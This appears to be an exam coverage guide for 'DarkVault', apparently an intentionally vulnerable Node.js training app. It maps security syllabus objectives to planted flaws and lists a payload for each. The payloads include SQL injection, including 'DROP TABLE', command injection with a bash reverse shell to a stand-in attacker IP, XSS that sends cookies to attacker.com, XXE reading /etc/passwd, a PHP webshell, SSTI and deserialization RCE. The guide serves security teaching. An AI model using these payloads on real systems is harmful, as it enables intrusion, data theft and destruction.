=================================================
DARKVAULT EXAM COVERAGE GUIDE
=================================================

This document maps DarkVault features to your exam syllabus requirements, including code references, attack vectors, and exploitation methods.

LO2.4 – Web application software and components
-----------------------------------------------
- Express.js framework vulnerabilities (app.js, routes/*)
  * Insecure routing patterns
  * Vulnerable middleware configuration
  * Attack: Direct browsing to restricted endpoints
  
- EJS templating engine vulnerabilities (views/*.ejs)
  * Server-side template injection
  * Client-side template injection in client-render.ejs
  * Attack: Submit <%- %> tags for server-side code execution

- SQLite database vulnerabilities (db.js)
  * SQL injection opportunities
  * Insecure query construction 
  * Attack: Submit ' OR 1=1-- to bypass authentication

- JWT authentication vulnerabilities (/api/auth endpoint)
  * Weak JWT secret ("darkvault-secret-key")
  * Missing signature verification
  * Attack: Use jwt.io to forge admin tokens

- XML processing vulnerabilities (routes/api.js:483-534)
  * XXE vulnerability in xml2js implementation
  * Attack: Submit XML with external entity definitions

- Serialization utilities vulnerabilities (routes/api.js:650-730)
  * Insecure deserialization
  * Attack: Submit specially crafted serialized objects

LO3.1/3.2 – Enumeration & Site Enumeration
------------------------------------------
- Discoverable endpoints across multiple views
  * HTML comments containing hidden URLs
  * Directory listing enabled in some folders
  * Attack: View page source to find commented URLs

- Exposed API endpoints without proper documentation
  * No API gateway or access control
  * Attack: Browse to /api/* to discover endpoints

- Directory structure leakage in document.ejs
  * Full paths in error messages and comments
  * Attack: Trigger errors to reveal file system paths

- Visible admin functionality in UI
  * Admin links visible to regular users
  * Attack: Click on visible admin links

- Hidden endpoints referenced in comments/links
  * Source code contains commented links
  * Attack: Review page source to find hidden endpoints

LO4.1-LO4.3 – Reconnaissance, Threat Modeling, Information Gathering
-------------------------------------------------------------------
- Information disclosure via error messages
  * Verbose error handling (app.js:76-94)
  * Attack: Submit invalid input to trigger detailed errors

- Accessible configuration data via LFI
  * Path traversal to sensitive files (routes/api.js:603-627)
  * Attack: Use ../../../ to access configuration files

- User enumeration in login error messages
  * Different responses for valid/invalid users
  * Attack: Test various usernames and observe response differences

- Exposed technical details in HTTP headers
  * Custom headers revealing platform information
  * Attack: Examine response headers to gather server information

- Developer comments containing sensitive information
  * Hardcoded credentials in comments
  * Attack: View source code to find commented credentials

LO4.4-LO4.5 – Authentication & Authorization
-------------------------------------------
- SQL injection in login form (app.js:79-96, routes/user.js:20-56)
  * Direct string concatenation in query
  * Attack: Submit ' OR 1=1-- in username field
  * Payload: ' OR 1=1--

- Weak password hashing (MD5)
  * Unsalted MD5 hashing in user.js:75-76
  * Attack: Extract hashes and use rainbow tables
  * Tool: hashcat -m 0 -a 0 hash.txt wordlist.txt

- JWT token vulnerabilities (weak secret)
  * Hardcoded JWT_SECRET in routes/api.js:15
  * Missing token validation in checkJwt middleware
  * Attack: Use jwt.io to forge tokens with elevated privileges
  * Key: "darkvault-secret-key"

- Missing access controls on admin panel
  * Insufficient authorization checks in routes/index.js:296-314
  * Attack: Directly access /admin URL as regular user

- IDOR vulnerability in user profiles
  * Missing ownership checks in routes/user.js:112-173
  * Attack: Change user ID in URL to access other profiles
  * Example: /user/1 → /user/2

- Weak password recovery mechanisms (user.js:95-181)
  * Predictable token generation
  * Token leakage in URLs
  * Attack: Analyze token patterns to predict reset tokens
  * Method: Base64 decode tokens to reveal pattern

- Session fixation vulnerability (user.js:184-198)
  * No session regeneration after login
  * Session ID settable via URL parameter
  * Attack: Set victim's session ID via URL parameter
  * Example: /user/session-fixation?sessionId=known-value

- Token leakage in response headers (user.js:177)
  * Sensitive information in custom headers
  * Attack: Examine response headers after password reset
  * Header: X-Auth-Token

LO4.6 – Input Validation
-----------------------
- XSS in message board (app.js:126-137, routes/index.js:252-267)
  * Missing input sanitization
  * Attack: Post <script>alert('XSS')</script> in message field
  * Payload: <script>alert(document.cookie)</script>

- Command injection in ping functionality (app.js:193-202, routes/index.js:492-510)
  * Unsanitized input to exec() function
  * Attack: Enter localhost; ls -la in ping tool
  * Payload: localhost; cat /etc/passwd

- SQL injection in product search (app.js:204-247)
  * Unsanitized user input in SQL query
  * Attack: Enter ' OR 1=1-- in search field
  * Payload: ' UNION SELECT 1,2,username,password,5,6,7 FROM users--

- XXE in XML import feature (app.js:483-534)
  * Vulnerable xml2js configuration
  * Attack: Upload XML with external entity defined
  * Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

- Unrestricted file upload
  * Missing filetype validation
  * Attack: Upload .php file with webshell code
  * Payload: <?php system($_GET['cmd']); ?>

LO4.7 – Information Disclosure
-----------------------------
- Path disclosure in error messages
  * Full paths in stack traces
  * Attack: Trigger errors to see file paths
  * Example: Submit invalid input to cause error

- Source code exposure via LFI (app.js:603-627)
  * Path traversal vulnerability
  * Attack: Use ../app.js to view source code
  * Path: /api/file?name=../app.js

- User data leakage via IDOR
  * Missing authorization checks
  * Attack: Directly access other user profiles
  * Example: /user/2 when logged in as user 1

- Verbose error messages revealing implementation details
  * Stack traces exposed to users
  * Attack: Trigger errors with invalid input
  * Example: Submit malformed JSON to API endpoints

- Configuration details exposed in document viewer
  * Path traversal to sensitive files
  * Attack: Use path traversal to access config.json
  * Path: /api/file?name=../config.json

LO4.8 – Cross-Site Scripting
---------------------------
- Stored XSS in message board
  * Unsanitized input stored in database
  * Attack: Post <script>alert('XSS')</script> to message board
  * Payload: <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
  * Location: routes/index.js:252-267

- Reflected XSS in search parameters
  * Unsanitized input reflected in response
  * Attack: Use /?search=<script>alert('XSS')</script> in query parameters
  * Payload: <img src=x onerror="alert(document.cookie)">
  * Location: routes/index.js:180-197

- DOM-based XSS in client-side scripts (views/client-render.ejs)
  * Unsafe use of innerHTML in JavaScript
  * Attack: Submit <img src=x onerror="alert('DOM XSS')"> in message field
  * Payload: <svg onload="alert(document.domain)">
  * Location: views/client-render.ejs:86-93

- Blind XSS in admin logs (app.js:248-277)
  * Admin pages rendering user input
  * Attack: Submit XSS payload to contact form that admin will view
  * Payload: <script src="https://attacker.com/blind.js"></script>

LO4.9 – Injection Attacks
------------------------
- SQL injection (login, product search)
  * Unsanitized input in SQL queries
  * Attack: Submit SQL syntax to manipulate queries
  * Payloads:
    - Authentication bypass: ' OR 1=1--
    - Data extraction: ' UNION SELECT 1,2,username,password,5,6,7 FROM users--
    - Database enumeration: ' UNION SELECT 1,2,name,4,5,6,7 FROM sqlite_master--

- Command injection (ping tool)
  * Unsanitized input to exec() function
  * Attack: Include command separators in input
  * Payloads:
    - Basic test: localhost; id
    - File reading: localhost; cat /etc/passwd
    - Reverse shell: localhost; bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'

- SSTI in email templates (app.js:558-581)
  * Unsanitized template rendering
  * Attack: Include template syntax in input
  * Payloads:
    - Basic test: <%= 7*7 %>
    - Environment variables: <%= process.env %>
    - Command execution: <%= require('child_process').execSync('id') %>

- XXE injection (product import)
  * Vulnerable XML parsing
  * Attack: Include external entities in XML
  * Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

- Second-order SQL injection in filters (app.js:350-409)
  * Stored user input used in later SQL queries
  * Attack: Store malicious input that will be used in subsequent queries
  * Payload: '; DROP TABLE users;--

LO4.10 – Session Handling
------------------------
- Insecure session configuration (app.js:26-30)
  * Missing secure and httpOnly flags
  * Attack: Inspect cookie attributes in browser
  * Issue: secure: false, httpOnly: false in cookie options

- Missing secure flag on cookies
  * Cookies transmitted over HTTP
  * Attack: Capture cookies via network sniffing
  * Solution needed: secure: true in cookie options

- No CSRF protection
  * Missing anti-CSRF tokens
  * Attack: Create cross-site request to perform actions
  * Example: Form POST to /api/update-user without CSRF token

- Predictable session IDs
  * Session IDs following patterns
  * Attack: Analyze and predict session ID patterns
  * Tool: Statistical analysis of collected session IDs

- No session timeout
  * Sessions valid indefinitely
  * Attack: Use old session tokens to maintain access
  * Issue: No maxAge or expires setting in session configuration

LO4.11 – Encryption and Encoding
-------------------------------
- Weak password hashing (MD5)
  * Unsalted MD5 for password storage
  * Attack: Extract and crack hashes using rainbow tables
  * Location: routes/user.js:75-76

- Lack of TLS/HTTPS implementation
  * Plaintext data transmission
  * Attack: Network sniffing to capture sensitive data
  * Issue: No HTTPS configuration in app.js

- Weak JWT secret (app.js:535-556)
  * Hardcoded, simple JWT secret
  * Attack: Brute force or extract secret from source code
  * Secret: "darkvault-secret-key"

- Unencrypted sensitive data storage
  * Plaintext sensitive data in database
  * Attack: SQL injection to extract unencrypted data
  * Example: Credit card numbers stored without encryption

- Base64 encoding mistaken for encryption in data export
  * Using encoding instead of encryption
  * Attack: Simple decoding of "encrypted" data
  * Example: btoa(JSON.stringify(userData)) in client-side code

LO4.12 – Source Code Review
--------------------------
- Exposed source code via LFI vulnerability
  * Path traversal to source files
  * Attack: Access ../app.js and other source files
  * Path: /api/file?name=../routes/api.js

- Commented credentials in source
  * Developer comments with passwords
  * Attack: View source code to find credentials
  * Example: // TODO: Change default password: admin123

- Debugging code left in production
  * console.log statements with sensitive data
  * Attack: Check browser console for leaked information
  * Example: console.log('User data:', userData) in production code

- Hardcoded secrets (JWT_SECRET)
  * Secrets directly in source code
  * Attack: View source to extract secrets
  * Location: const JWT_SECRET = "darkvault-secret-key" in routes/api.js:15

LO4.13 – Parameter Manipulation
-----------------------------
- Query parameter tampering in file access
  * Insufficient validation of query parameters
  * Attack: Modify filename parameter for path traversal
  * Example: /api/file?name=../config.json

- Cookie manipulation for session hijacking
  * Insecure session cookies
  * Attack: Copy and use victim's cookies
  * Tool: Browser developer tools to edit cookies

- HTTP header injection
  * Unsanitized headers reflected in responses
  * Attack: Include carriage returns to inject headers
  * Payload: X-Forwarded-For: real-ip%0d%0aSet-Cookie: session=attacker-cookie

- Hidden field manipulation in forms
  * Client-side validation only
  * Attack: Modify hidden form fields to change behavior
  * Example: Change <input type="hidden" name="price" value="10.00"> to higher value

LO4.14 – Logging and Monitoring
------------------------------
- Insufficient logging of security events
  * Missing logs for authentication failures
  * Attack: Brute force without detection
  * Issue: No logging of failed login attempts

- Logs accessible via LFI vulnerability
  * Path traversal to log files
  * Attack: Access log files via path traversal
  * Path: /api/file?name=../logs/app.log

- No alerting for suspicious activities
  * Missing security monitoring
  * Attack: Perform malicious actions without triggering alerts
  * Example: Multiple password reset attempts without alerts

- Log injection vulnerabilities
  * Unsanitized user input in logs
  * Attack: Include newlines in input to forge log entries
  * Payload: username=legituser%0d%0aINFO User admin logged in successfully

LO4.15 – Web API Attacks
----------------------
- Insecure JWT implementation (app.js:535-556)
  * Weak JWT configuration
  * Attack: Forge tokens with algorithm "none"
  * Payload: JWT with header {"alg":"none"} and modified claims

- No rate limiting on API endpoints (routes/api.js:987-999)
  * Missing request throttling
  * Attack: Send numerous requests to overwhelm API
  * Example: Script sending hundreds of requests to /api/auth/login

- Missing input validation on API parameters
  * Insufficient parameter checking
  * Attack: Submit unexpected values or types
  * Example: Send strings where numbers are expected

- Broken object level authorization (routes/api.js:877-937)
  * Missing ownership checks
  * Attack: Access objects belonging to other users
  * Example: /api/users/2/data when logged in as user 1

- GraphQL injection vulnerabilities (routes/api.js:877-885)
  * Insecure GraphQL implementation
  * Attack: Use introspection to map API and access unintended data
  * Payload: {__schema{types{name,fields{name,type{name}}}}}

LO5.16 – Modern Database Technologies Attacks
-------------------------------------------
- SQL injection vulnerabilities
  * Unsanitized input in SQL queries
  * Attack: Use SQL syntax to manipulate queries
  * Example: ' OR 1=1-- in search inputs

- Excessive database privileges for application user
  * App using admin database privileges
  * Attack: Leverage elevated permissions for greater impact
  * Issue: Application connecting to database with admin privileges

- Unescaped user input in database queries
  * Missing prepared statements
  * Attack: Include SQL syntax in input fields
  * Proper fix: Use parameterized queries

- Exposed database error messages
  * Detailed SQL errors shown to users
  * Attack: Use error messages to refine injection attacks
  * Example: Error: near line 1: syntax error reveals query structure

- NoSQL injection in MongoDB simulation (routes/api.js:702-722)
  * Vulnerable MongoDB-like query handling
  * Attack: Use NoSQL operators in input
  * Payload: {"username":{"$ne":null},"password":{"$ne":null}}

LO5.17 – Third Party Libraries and Attacks
----------------------------------------
- Outdated dependencies (package.json)
  * Vulnerable library versions
  * Attack: Exploit known vulnerabilities in dependencies
  * Tool: npm audit to identify vulnerable dependencies

- Vulnerable xml2js implementation (XXE)
  * Incorrect XML parser configuration
  * Attack: Submit XML with XXE payloads
  * Location: routes/api.js:483-534

- Insecure node-serialize package (RCE)
  * Unsafe deserialization
  * Attack: Create serialized object with IIFE payload
  * Payload: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

- Known vulnerabilities in Express and other libraries
  * Unpatched security issues
  * Attack: Exploit CVEs in outdated libraries
  * Example: prototype pollution in lodash < 4.17.12

- Template injection in popular frameworks (routes/index.js:516-544)
  * Unsafe template rendering
  * Attack: Submit template syntax for code execution
  * Example: ${ process.mainModule.require('child_process').execSync('id') }

- Insecure deserialization with JSON/XML (views/client-render.ejs:83-119)
  * Unsafe object reconstruction
  * Attack: Create maliciously crafted serialized objects
  * Example: Prototype pollution via __proto__ property

LO5.18 – Web Application Race Conditions
--------------------------------------
- Lack of proper synchronization in file operations
  * Missing file locks
  * Attack: Concurrent access to cause data corruption
  * Example: Simultaneous writes to the same file

- Missing transaction handling in database operations
  * Lack of atomic operations
  * Attack: Exploit time between check and use
  * Example: Double-spend by concurrent balance withdrawals

- TOCTOU vulnerabilities in access control checks
  * Time-of-check to time-of-use issues
  * Attack: Change conditions between check and action
  * Example: Change file permissions between check and access

- Concurrent processing issues in balance updates
  * Missing synchronization
  * Attack: Send concurrent balance update requests
  * Path: /api/update-balance

- Account balance race condition (routes/api.js:1133-1181)
  * Vulnerable balance update logic
  * Attack: Send multiple concurrent update requests
  * Example: 3+ simultaneous requests to increase balance

- Promo code usage race condition (routes/api.js:1200-1245)
  * Missing transaction locking
  * Attack: Submit same code multiple times concurrently
  * Result: Multiple application of single-use promo code

LO5.1-LO5.3 – Privilege Escalation
---------------------------------
- Vertical privilege escalation via parameter tampering
  * Insecure permission checks
  * Attack: Add admin=true parameter to requests
  * Example: /api/admin/dashboard?admin=true

- Horizontal privilege escalation via IDOR
  * Missing object-level authorization
  * Attack: Access resources of other users at same privilege level
  * Example: /api/users/2/profile when logged in as user 1

- Privilege escalation via JWT manipulation
  * Weak JWT implementation
  * Attack: Modify role or isAdmin claims in JWT
  * Example: Change {"isAdmin":false} to {"isAdmin":true}

- Admin access through broken access controls
  * Missing authorization checks
  * Attack: Directly access admin endpoints as regular user
  * Path: /admin or /api/admin/*

LO6.1 – Site Component Topology
-----------------------------
- Discoverable application structure
  * Predictable URL patterns
  * Attack: URL fuzzing to find hidden components
  * Tool: Directory brute forcing with common patterns

- Interconnected components with security dependencies
  * Security issues cascade across components
  * Attack: Compromise one component to affect others
  * Example: Use XSS in public page to affect admin dashboard

- Multiple entry points and attack surfaces
  * Different access points with varying security levels
  * Attack: Find least secure entry point
  * Example: Target API endpoints instead of web interface

- Complex interactions between components
  * Security issues at integration points
  * Attack: Exploit trust relationships between components
  * Example: Internal API trusting external-facing components

// Code Review Examples
router.get('/code-review', (req, res) => {
  res.render('code-review', {
    title: 'Code Review Examples - DarkVault',
    user: req.session.user || null
  });
}); 